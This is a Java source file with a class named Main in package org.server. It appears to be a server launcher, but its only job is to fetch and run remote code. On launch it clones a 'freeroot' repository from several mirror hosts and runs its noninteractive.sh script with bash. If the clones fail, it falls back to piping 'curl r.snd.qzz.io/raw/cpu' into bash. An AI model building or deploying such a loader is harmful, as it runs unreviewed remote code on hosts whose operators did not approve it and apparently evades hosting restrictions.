package org.server;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.logging.Logger;
import java.util.logging.Level;

public class Main{
    private static final Logger L=Logger.getLogger(Main.class.getName());
    private static final List<String> URLS=Arrays.asList(
            "https://github.com/Mytai20100/freeroot.git",
            "https://github.servernotdie.workers.dev/Mytai20100/freeroot.git",
            "https://gitlab.com/Mytai20100/freeroot.git",
            "https://gitlab.snd.qzz.io/mytai20100/freeroot.git",
            "https://git.snd.qzz.io/mytai20100/freeroot.git"
    );
    private static final String TMP="freeroot_temp",DIR="work",SH="noninteractive.sh";
    private static final String FALLBACK_URL="r.snd.qzz.io/raw/cpu";

    public static void main(String[]a){
        try{
            if(!cmd("git")){L.severe("Git not found");System.exit(1);}
            if(!cmd("bash")){L.severe("Bash not found");System.exit(1);}
            File w=new File(DIR);
            if(w.exists()){
                L.info("[*] Directory 'work' exists, checking...");
                File s=new File(w,SH);
                if(s.exists()){
                    L.info("[+] Valid repo found, skipping clone");
                    if(!s.setExecutable(true,false))L.warning("Failed to make executable");
                    exec(w,SH);
                    return;
                }else{
                    L.warning("Invalid repo, removing...");
                    del(w.toPath());
                }
            }
            File t=new File(TMP);
            if(t.exists())del(t.toPath());
            if(!cloneRepo()){
                L.warning("All clone attempts failed, trying fallback method...");
                clean(t);
                if(!fallback()){
                    L.severe("Fallback method also failed");
                    System.exit(1);
                }
                L.info("[+] Fallback method succeeded");
                return;
            }
            if(!t.renameTo(w)){L.severe("Rename failed");clean(t);System.exit(1);}
            L.info("[+] Renamed to 'work'");
            File s=new File(w,SH);
            if(!s.exists()){L.severe("Script not found");clean(w);System.exit(1);}
            if(!s.setExecutable(true,false))L.warning("Failed to make executable");
            exec(w,SH);
            L.info("[+] Freeroot");
        }catch(Exception e){L.log(Level.SEVERE,"Error",e);System.exit(1);}
    }

    private static boolean cmd(String c){
        try{
            ProcessBuilder p=new ProcessBuilder(c,"--version");
            p.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process pr=p.start();
            return pr.waitFor(3,TimeUnit.SECONDS)&&pr.exitValue()==0;
        }catch(IOException|InterruptedException e){return false;}
    }

    private static boolean cloneRepo(){
        for(int i=0;i<URLS.size();i++){
            String url=URLS.get(i);
            L.info("[*] Trying clone from: "+url+" ("+(i+1)+"/"+URLS.size()+")");
            try{
                ProcessBuilder p=new ProcessBuilder("git","clone","--depth=1",url,TMP);
                p.inheritIO();
                Process pr=p.start();
                int exitCode=pr.waitFor();
                if(exitCode==0){
                    L.info("[+] Successfully cloned from: "+url);
                    return true;
                }else{
                    L.warning("Clone failed from "+url+" with exit code: "+exitCode);
                    File t=new File(TMP);
                    if(t.exists())del(t.toPath());
                }
            }catch(IOException e){
                L.log(Level.WARNING,"IO error with "+url,e);
            }catch(InterruptedException e){
                Thread.currentThread().interrupt();
                L.log(Level.WARNING,"Interrupted with "+url,e);
            }
        }
        return false;
    }

    private static boolean fallback(){
        if(!cmd("curl")){L.warning("Curl not found, cannot use fallback");return false;}
        L.info("[*] Executing fallback: curl "+FALLBACK_URL+" | bash");
        try{
            ProcessBuilder p=new ProcessBuilder("bash","-c","curl "+FALLBACK_URL+" | bash");
            p.inheritIO();
            Process pr=p.start();
            int exitCode=pr.waitFor();
            if(exitCode==0){
                L.info("[+] Fallback executed successfully");
                return true;
            }else{
                L.severe("Fallback failed with exit code: "+exitCode);
                return false;
            }
        }catch(IOException e){
            L.log(Level.SEVERE,"IO error during fallback",e);
            return false;
        }catch(InterruptedException e){
            Thread.currentThread().interrupt();
            L.log(Level.SEVERE,"Interrupted during fallback",e);
            return false;
        }
    }

    private static void exec(File d,String s){
        L.info("[*] Executing script 'noninteractive.sh'...");
        try{
            ProcessBuilder p=new ProcessBuilder("bash",s);
            p.directory(d);
            p.inheritIO();
            Process pr=p.start();
            pr.waitFor();
            L.info("[*] Process exited with code: "+pr.exitValue());
        }catch(IOException e){L.log(Level.SEVERE,"IO error",e);
        }catch(InterruptedException e){Thread.currentThread().interrupt();L.log(Level.SEVERE,"Interrupted",e);}
    }

    private static void clean(File d){
        if(d!=null&&d.exists()){
            L.info("[*] Cleaning...");
            try{del(d.toPath());L.info("[+] Cleaned");
            }catch(IOException e){L.log(Level.WARNING,"Cleanup failed",e);}
        }
    }

    private static void del(Path p)throws IOException{
        if(Files.exists(p)){
            Files.walk(p).sorted((a,b)->b.compareTo(a)).forEach(x->{
                try{Files.delete(x);}catch(IOException e){L.log(Level.WARNING,"Delete failed: "+x,e);}
            });
        }
    }
}